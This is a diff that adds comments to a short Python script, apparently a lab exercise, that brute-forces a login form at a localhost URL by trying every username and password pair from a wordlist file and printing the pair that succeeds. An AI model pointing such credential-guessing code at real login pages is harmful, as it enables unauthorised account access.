@@ -1,11 +1,13 @@
 import json
 from requests import post as POST
 import sys
+# open external text file containing random words
 f = open('dictionary.txt', 'r')
 dictionary = f.read().split('\n')
 URL = 'http://127.0.0.1:5000/login1'
 if __name__ == '__main__':
     success = False
+    # for every words check for username and password
     while not success:
         for i in dictionary:
             trial_username = i
@@ -16,4 +18,9 @@ if __name__ == '__main__':
                 if success:
                     print(f'Username id {trial_username}\nPassword is {trial_password}')
                     sys.exit()
-                    
+
+
+
+
+
+
